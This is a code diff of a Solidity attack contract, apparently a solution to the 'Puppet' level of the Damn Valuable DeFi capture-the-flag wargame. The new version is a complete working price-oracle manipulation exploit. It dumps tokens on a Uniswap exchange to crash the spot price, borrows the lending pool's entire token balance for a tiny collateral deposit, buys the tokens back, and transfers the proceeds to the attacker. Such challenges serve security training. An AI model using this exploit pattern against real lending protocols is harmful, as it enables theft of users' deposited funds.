@@ -1,33 +1,75 @@
-// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+// SPDX-License-Identifier: MIT
+
 pragma solidity ^0.8.0;
 
-import {IUniswapExchange} from "./IUniswapExchange.sol";
-import {PuppetPool} from "./PuppetPool.sol";
-import {DamnValuableToken} from "../DamnValuableToken.sol";
+import "../DamnValuableToken.sol";
+import "./PuppetPool.sol";
+
+import "hardhat/console.sol";
 
 contract AttackPuppet {
-    uint256 amount1 = 1000 ether;
-    uint256 amount2 = 100000 ether;
+    DamnValuableToken dvt;
+    PuppetPool pool;
 
-    IUniswapExchange public exchange;
-    PuppetPool public pool;
-    DamnValuableToken public token;
-    address public player;
+    constructor(
+        uint256 initPlayerTokens,
+        uint256 initPoolTokens,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s,
+        address uniswap,
+        address _token,
+        address _pool
+    ) payable {
+        dvt = DamnValuableToken(_token);
+        pool = PuppetPool(_pool);
 
-    // uint256 public count;
+        // Call permit function with signature provided to allow us
+        // to transfer the tokens to the contract in one transaction
+        dvt.permit(msg.sender, address(this), initPlayerTokens, deadline, v, r, s);
+        dvt.transferFrom(msg.sender, address(this), initPlayerTokens);
+        printTokenAmounts(address(this));
 
-    constructor(IUniswapExchange _exchange, PuppetPool _pool, DamnValuableToken _token, address _player) payable {
-        exchange = _exchange;
-        pool = _pool;
-        token = _token;
-        player = _player;
+        // Approve token to swap with UniSwap
+        dvt.approve(uniswap, initPlayerTokens);
+        // Transfer all Tokens for Eth to heavily devalue the Tokens
+        bytes memory tok2Eth =
+            abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", initPlayerTokens, 9 ether, deadline);
+        (bool success, bytes memory returnData) = uniswap.call(tok2Eth);
+        require(success, "failed to swap");
+
+        printTokenAmounts(address(this));
+
+        // Get the new deposit required with the new heavily devalued Token
+        // to get ALL tokens in the pool
+        uint256 deposit = pool.calculateDepositRequired(initPoolTokens);
+        pool.borrow{value: deposit}(initPoolTokens, address(this));
+        printTokenAmounts(address(this));
+
+        // Calculate the ethPrice required to get all our original tokens back
+        bytes memory eth2TokPrice = abi.encodeWithSignature("getEthToTokenOutputPrice(uint256)", initPlayerTokens);
+        (success, returnData) = uniswap.call(eth2TokPrice);
+        require(success, "failed to get eth price");
+        uint256 ethPrice = uint256(bytes32(returnData));
+        console.log("Price", ethPrice);
+
+        // Swap eth again to get our initial tokens back
+        bytes memory eth2Tok =
+            abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", initPlayerTokens, deadline);
+        (success, returnData) = uniswap.call{value: ethPrice}(eth2Tok);
+        require(success, "failed to get Tokens back");
+        printTokenAmounts(address(this));
+
+        // Transfer all Tokens and eth back to the player EOA
+        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
+        payable(msg.sender).transfer(address(this).balance);
     }
 
-    function swap() public {
-        token.approve(address(exchange), amount1);
-        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
-        pool.borrow{value: 20 ether, gas: 1000000}(amount2, player);
+    // Helper function to print balances (only works in hardhat)
+    function printTokenAmounts(address _add) internal view {
+        console.log("DVT", dvt.balanceOf(_add));
+        console.log("ETH", _add.balance);
+        console.log("");
     }
-
-    receive() external payable {}
 }
